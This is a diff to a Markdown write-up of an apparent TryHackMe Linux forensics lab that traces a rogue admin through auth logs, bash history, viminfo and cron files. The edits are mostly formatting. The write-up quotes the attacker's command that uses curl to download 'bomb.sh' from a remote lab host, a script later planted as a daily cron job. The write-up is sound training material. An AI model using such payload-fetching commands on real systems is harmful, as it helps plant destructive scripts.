@@ -13,7 +13,7 @@ CyberT wants us to check if this person has done anything malicious to any of th
 ## Tools Used
 - Crontab Guru
 
-## Pre-requisites
+## Prerequisites
 This room requires basic knowledge of Linux and is based on the [Linux Forensics room](https://tryhackme.com/room/linuxforensics). A cheat sheet is attached below.
 
 ![Linux Forensics Cheatsheet](images/Linux-Forensics-Cheatsheet.png)
@@ -28,7 +28,7 @@ This room requires basic knowledge of Linux and is based on the [Linux Forensics
 *My advice: Look at the privileged commands that were run. That should get you started.*
 
 ### 1. The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
-Tracking down sudo commands from auth logs helped to locate the full command that was ran to install the package, <mark>/usr/bin/apt install dokuwiki</mark>. This was achieved by using the command:
+Tracking down sudo commands from auth logs helped to locate the full command that was ran to install the package, <mark>`/usr/bin/apt install dokuwiki`</mark>. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep COMMAND
@@ -37,14 +37,14 @@ grep sudo auth.log* | grep COMMAND
 ![command-home-cybert](images/command-home-cybert.png)
 
 ### 2. What was the present working directory (PWD) when the previous command was run?
-From the same image above, the command was ran from the <mark>/home/cybert</mark> working directory.
+From the same image above, the command was ran from the <mark>`/home/cybert`</mark> working directory.
 
 ---
 
 *Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.*
 
 ### 3. Which user was created after the package from the previous task was installed?
-Searching for the "adduser" string pointed out the user creation of <mark>it-admin</mark>. This was achieved by using the command:
+Searching for the `adduser` string pointed out the user creation of <mark>it-admin</mark>. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep adduser
@@ -53,7 +53,7 @@ grep sudo auth.log* | grep adduser
 ![it-admin](images/it-admin.png)
 
 ### 4. A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
-When editing the sudoers file, visudo is used. To know when the file was last updated, correlating indicators (timestamp, hostname, program, user, PWD, and COMMAND) were used. The sudoers file was update on <mark>Dec 28 06:27:34</mark>. This was achieved by using the command:
+When editing the sudoers file, `visudo` is used. To know when the file was last updated, correlating indicators (timestamp, hostname, program, user, PWD, and COMMAND) were used. The sudoers file was update on <mark>`Dec 28 06:27:34`</mark>. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep visudo
@@ -62,7 +62,7 @@ grep sudo auth.log* | grep visudo
 ![Dec-28-06-27-34](images/Dec-28-06-27-34.png)
 
 ### 5. A script file was opened using the "vi" text editor. What is the name of this file?
-By searching for the "vi" command, the <mark>bomb.sh</mark> script was tracked down. This was validated by the user that ran it, the attacker created account, it-admin. This was achieved by using the command:
+By searching for the `vi` command, the <mark>`bomb.sh`</mark> script was tracked down. This was validated by the user that ran it, the attacker created account, it-admin. This was achieved by using the command:
 
 ```
 grep sudo auth.log* | grep vi
@@ -78,7 +78,7 @@ grep sudo auth.log* | grep vi
 
 *Tip: The command was run by a different user account. Look at the ".bash_history" in the user's home directory.*
 
-By going to the /home/it-admin directory and inspecting its bash history, the command (<mark>curl 10.10.158.38:8080/bomb.sh --output bomb.sh</mark>) to download the script was identified. This was achieved by using the command:
+By going to the `/home/it-admin` directory and inspecting its bash history, the command (<mark>`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`</mark>) to download the script was identified. This was achieved by using the command:
 
 ```
 cat .bash_history
@@ -90,7 +90,7 @@ cat .bash_history
 
 *Tip: The vi text editor can edit and save files to a different location. Check out the history of vi by looking for ".viminfo".*
 
-By investigating the Command Line History of .viminfo, bomb.sh was saved and renamed to <mark>bin/os-update.sh</mark>. This was achieved by using the command:
+By investigating the Command Line History of `.viminfo`, `bomb.sh` was saved and renamed to <mark>`bin/os-update.sh`</mark>. This was achieved by using the command:
 
 ```
 vi .viminfo
@@ -99,7 +99,7 @@ vi .viminfo
 ![os-update-sh](images/os-update-sh.png)
 
 ### 8. When was the file from the previous question last modified? (Format: Month Day HH:MM) This was achieved by using the command:
-The last modification date of the os-update.sh file were identified by listing the contents of the /bin directory and using the full time option The date was <mark>Dec 28 06:29</mark>. This was achieved by using the command:
+The last modification date of the `os-update.sh` file were identified by listing the contents of the `/bin` directory and using the `--full-time` option. The date was <mark>`Dec 28 06:29`</mark>. This was achieved by using the command:
 
 ```
 ls -l --full-time | grep "os-update.sh"
@@ -108,7 +108,7 @@ ls -l --full-time | grep "os-update.sh"
 ![full-time](images/full-time.png)
 
 ### 9. What is the name of the file that will get created when the file from the first question executes?
-From the same image above, reading the file shows that <mark>goodbye.txt.</mark> will be created if it gets executed. This was achieved by using the command:
+From the same image above, reading the file shows that <mark>`goodbye.txt`</mark> will be created if it gets executed. This was achieved by using the command:
 
 ```
 cat os-update.sh
@@ -126,7 +126,7 @@ cat os-update.sh
 
 *Tip: Check out the crontab and convert the schedule expression using a site like https://crontab.guru/.*
 
-By reading all the cron files and grepping for os-update.sh, its cron job were located. This was achieved by using the command:
+By reading all the cron files and grepping for `os-update.sh`, its cron job were located. This was achieved by using the command:
 
 ```
 cat cron* | grep "os-update.sh"
@@ -134,7 +134,7 @@ cat cron* | grep "os-update.sh"
 
 ![cat-grep-os-update-sh](images/cat-grep-os-update-sh.png)
 
-To decode its schedule, Crontab Guru were utilized. The job will run at <mark>08:00 AM</mark> every day.
+To decode its schedule, Crontab Guru were utilized. The job will run at <mark>`08:00 AM`</mark> every day.
 
 ![crontab-guru](images/crontab-guru.png)
 
